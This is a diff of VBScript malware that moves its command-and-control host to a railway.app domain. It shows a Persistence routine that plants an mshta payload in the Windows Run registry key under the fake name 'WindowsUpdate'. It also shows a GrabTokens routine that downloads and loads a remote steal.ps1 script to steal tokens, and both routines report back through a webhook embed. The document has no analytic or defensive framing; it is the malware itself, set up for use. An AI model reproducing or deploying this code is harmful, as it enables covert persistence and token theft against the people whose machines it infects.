@@ -146,7 +146,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta https://dicerigx.app/"
+    Dim payload : payload = "mshta https://cheatz.up.railway.app/"
     On Error Resume Next
     
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -160,11 +160,11 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280)
 End Sub
 
-' --- GrabTokens ---
+' --- GrabTokens (POINTING TO YOUR RAILWAY) ---
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://dicerigx.app/steal.ps1", False
+    xh.Open "GET", "https://cheatz.up.railway.app/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
